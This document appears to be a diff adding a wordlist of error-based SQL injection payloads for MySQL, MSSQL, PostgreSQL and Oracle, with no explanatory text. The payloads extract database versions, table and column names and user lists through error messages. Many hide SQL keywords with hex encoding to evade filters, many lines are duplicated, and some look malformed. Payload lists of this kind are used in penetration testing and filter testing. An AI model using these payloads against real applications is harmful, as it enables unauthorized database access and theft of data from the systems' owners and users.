+1' AND 1=(SELECT (UNHEX('43415354'))((SELECT table_name FROM information_schema.tables LIMIT 1) AS UNSIGNED))--
+1' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
+1' AND 1=(SELECT (CONVERT(varchar, 0x434F4E56455254))(int, (SELECT TOP 1 table_name FROM information_schema.tables)))--
+1' AND 1=(SELECT 1/0 FROM sys.objects WHERE name='nonexistent_table')--
+1' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.columns WHERE object_id=OBJECT_ID('users')))--
+1' AND 1=(CONVERT(varchar, 0x53454C454354) 1/0 FROM sys.objects WHERE name='nonexistent_table')--
+1' AND 1=LEN((SELECT TOP 1 table_name FROM information_schema.tables))--
+1' AND 1=CONVERT(int, (SELECT TOP 1 object_id FROM sys.objects))--
+1' AND 1=(SELECT 1/NULLIF(0,0) FROM sys.objects WHERE name='nonexistent_table')-- -- avoids parse error
+1' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.columns WHERE object_id=OBJECT_ID('users')))--
+' AND 1=LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1))--
+' AND 1=(SELECT 1 FROM nonexistent_table WHERE 1=1)--
+' AND 1=LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1))--
+-- Decode example: just return decoded value
+' AND 1=length(decode('43415354', 'hex'))--
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1)))--
+-- CAST to unsigned
+1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS UNSIGNED)--
+1'SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual
+1'SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual
+1'SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual
+1'SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual
+1'SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users
+1'SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))
+1'XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()
+1'XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()
+1'AND 1337=(SELECT UPPER(XMLType(CHR(60)\|\|CHR(58)\|\|'~'\|\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\|\|'~'\|\|CHR(62))) FROM DUAL) -- -
+1'AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\|\|(SELECT banner FROM v$version)\|\|'~') -- -
+1' AND LENGTH(UNHEX('4558545241435456414C5545'))=22--
+1'AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -
+1'AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -
+1'AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -
+1'AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -
+1'AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -
+1'OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -
+1'AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
+1'AND UUID_TO_BIN(version())='1
+1' AND 1337=(SELECT (decode('43415354', 'hex'))('~'||(SELECT (decode('53454C454354', 'hex')) version())::text||'~' AS NUMERIC))--
+1' AND ((SELECT (decode('43415354', 'hex'))('~'||(SELECT (decode('53454C454354', 'hex')) version())::text||'~' AS NUMERIC)))--
+1' AND (SELECT (decode('43415354', 'hex'))((SELECT (decode('53454C454354', 'hex')) version()) AS INT))=1337--
+1' AND ((SELECT (decode('53454C454354', 'hex')) version())::int)=1--
+1' AND 1337=(SELECT (CONVERT(varchar, 0x434F4E56455254))(INT, (SELECT (CONVERT(varchar, 0x53454C454354)) '~'+((SELECT (CONVERT(varchar, 0x53454C454354)) @@version))+'~'))--
+1' AND 1337 IN ((SELECT (CONVERT(varchar, 0x53454C454354)) ('~'+((SELECT (CONVERT(varchar, 0x53454C454354)) @@version))+'~'))--
+1' AND 1337=(SELECT (CONVERT(varchar, 0x434F4E434154))('~', (SELECT (CONVERT(varchar, 0x53454C454354)) @@version), '~'))--
+1' (SELECT (CONVERT(varchar, 0x434F4E56455254))((SELECT (CONVERT(varchar, 0x53454C454354)) @@version) AS INT))--
+- 1' AND (SELECT (UNHEX('475449445F535542534554'))(CONCAT('~',((SELECT (UNHEX('53454C454354')) version())),'~'),1337)--
+- 1' AND (SELECT (UNHEX('4A534F4E5F4B455953'))((SELECT (UNHEX('434F4E56455254'))((SELECT (UNHEX('434F4E434154'))('~',((SELECT (UNHEX('53454C454354')) version())),'~')) USING utf8)))--
+- 1' AND (SELECT (UNHEX('4558545241435456414C5545'))(1337,(SELECT (UNHEX('434F4E434154'))('.','~',((SELECT (UNHEX('53454C454354')) version())),'~')))--
+- 1' AND (SELECT (UNHEX('555044415445584D4C'))(1337,(SELECT (UNHEX('434F4E434154'))('.','~',((SELECT (UNHEX('53454C454354')) version())),'~'),31337))--
+- 1' AND (SELECT (UNHEX('455850'))(~((SELECT * FROM ((SELECT (UNHEX('53454C454354')) (SELECT (UNHEX('434F4E434154'))('~',((SELECT (UNHEX('53454C454354')) version())),'~','x')))x))))--
+- 1' OR 1 GROUP BY (SELECT (UNHEX('434F4E434154'))('~',((SELECT (UNHEX('53454C454354')) version())),'~',FLOOR(RAND(0)*2)) HAVING MIN(0)--
+- 1' AND ((SELECT * FROM ((SELECT (UNHEX('4E414D455F434F4E5354'))(version(),1),(SELECT (UNHEX('4E414D455F434F4E5354'))(version(),1))) AS x))--
+- 1' AND (SELECT (UNHEX('555549445F544F5F42494E'))(version()))='1--
+1' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
+1' AND 1=LEN((SELECT TOP 1 table_name FROM information_schema.tables))--
+1' AND 1=CONVERT(int, (SELECT TOP 1 object_id FROM sys.objects))--
+1' AND 1=(SELECT 1/NULLIF(0,0) FROM sys.objects WHERE name='nonexistent_table')--
+1' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.columns WHERE object_id=OBJECT_ID('users')))--
+1'AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -
+1'AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -
+1'AND 1337=CONCAT('~',(SELECT @@version),'~') -- -
+1'CAST((SELECT @@version) AS INT)
+1' AND 1337=(SELECT (CONVERT(varchar, 0x434F4E56455254))(INT, (SELECT (CONVERT(varchar, 0x53454C454354)) '~'+((SELECT (CONVERT(varchar, 0x53454C454354)) @@version))+'~'))--
+1' AND 1337 IN ((SELECT (CONVERT(varchar, 0x53454C454354)) ('~'+((SELECT (CONVERT(varchar, 0x53454C454354)) @@version))+'~'))--
+1' AND 1337=(SELECT (CONVERT(varchar, 0x434F4E434154))('~', (SELECT (CONVERT(varchar, 0x53454C454354)) @@version), '~'))--
+1' (SELECT (CONVERT(varchar, 0x434F4E56455254))((SELECT (CONVERT(varchar, 0x53454C454354)) @@version) AS INT))--
+' AND 1=LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1))--
+' AND 1=(SELECT 1 FROM nonexistent_table WHERE 1=1)--
+' AND 1=LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1))--
+' AND 1=length(decode('43415354', 'hex'))--
+1' AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -
+1' AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -
+1' AND CAST((SELECT version()) AS INT)=1337 -- -
+1' AND (SELECT version())::int=1 -- -
+1' AND 1337=(SELECT (decode('43415354', 'hex'))('~'||(SELECT (decode('53454C454354', 'hex')) version())::text||'~' AS NUMERIC))--
+1' AND ((SELECT (decode('43415354', 'hex'))('~'||(SELECT (decode('53454C454354', 'hex')) version())::text||'~' AS NUMERIC)))--
+1' AND (SELECT (decode('43415354', 'hex'))((SELECT (decode('53454C454354', 'hex')) version()) AS INT))=1337--
+1' AND ((SELECT (decode('53454C454354', 'hex')) version())::int)=1--
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1)))--
+1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS UNSIGNED)--
+1' AND LENGTH(UNHEX('4558545241435456414C5545'))=22--
+1'AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -
+1'AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -
+1'AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -
+1'AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -
+1'AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -
+1'OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -
+1'AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
+1'AND UUID_TO_BIN(version())='1
+- 1' AND (SELECT (UNHEX('475449445F535542534554'))(CONCAT('~',((SELECT (UNHEX('53454C454354')) version())),'~'),1337)--
+- 1' AND (SELECT (UNHEX('4A534F4E5F4B455953'))((SELECT (UNHEX('434F4E56455254'))((SELECT (UNHEX('434F4E434154'))('~',((SELECT (UNHEX('53454C454354')) version())),'~')) USING utf8)))--
+- 1' AND (SELECT (UNHEX('4558545241435456414C5545'))(1337,(SELECT (UNHEX('434F4E434154'))('.','~',((SELECT (UNHEX('53454C454354')) version())),'~')))--
+- 1' AND (SELECT (UNHEX('555044415445584D4C'))(1337,(SELECT (UNHEX('434F4E434154'))('.','~',((SELECT (UNHEX('53454C454354')) version())),'~'),31337))--
+- 1' AND (SELECT (UNHEX('455850'))(~((SELECT * FROM ((SELECT (UNHEX('53454C454354')) (SELECT (UNHEX('434F4E434154'))('~',((SELECT (UNHEX('53454C454354')) version())),'~','x')))x))))--
+- 1' OR 1 GROUP BY (SELECT (UNHEX('434F4E434154'))('~',((SELECT (UNHEX('53454C454354')) version())),'~',FLOOR(RAND(0)*2)) HAVING MIN(0)--
+- 1' AND ((SELECT * FROM ((SELECT (UNHEX('4E414D455F434F4E5354'))(version(),1),(SELECT (UNHEX('4E414D455F434F4E5354'))(version(),1))) AS x))--
+- 1' AND (SELECT (UNHEX('555549445F544F5F42494E'))(version()))='1--
+1' AND 1=TO_NUMBER((SELECT table_name FROM all_tables WHERE ROWNUM=1))--
+1' AND 1=(SELECT (CAST(HEXTORAW('544F5F4E554D424552') AS VARCHAR2(20)))((SELECT table_name FROM all_tables WHERE ROWNUM=1)))--
+1' AND 1=TO_NUMBER((SELECT table_name FROM all_tables WHERE ROWNUM=1))--
+1' AND 1=XMLTYPE((SELECT table_name FROM all_tables WHERE ROWNUM=1))--
+1' AND 1=(SELECT (CAST(HEXTORAW('584D4C54595045') AS VARCHAR2(20)))((SELECT table_name FROM all_tables WHERE ROWNUM=1)))--
+1' AND 1=XMLTYPE((SELECT (HEXTORAW('53454C454354') table_name FROM all_tables WHERE ROWNUM=1)))--
+1'SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual
+1'SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual
+1'SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual
+1'SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual
+1'SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users
+1'SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))
+1'XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()
+1'XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()
+1'AND 1337=(SELECT UPPER(XMLType(CHR(60)\|\|CHR(58)\|\|'~'\|\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\|\|'~'\|\|CHR(62))) FROM DUAL) -- -
+1'AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\|\|(SELECT banner FROM v$version)\|\|'~') -- -
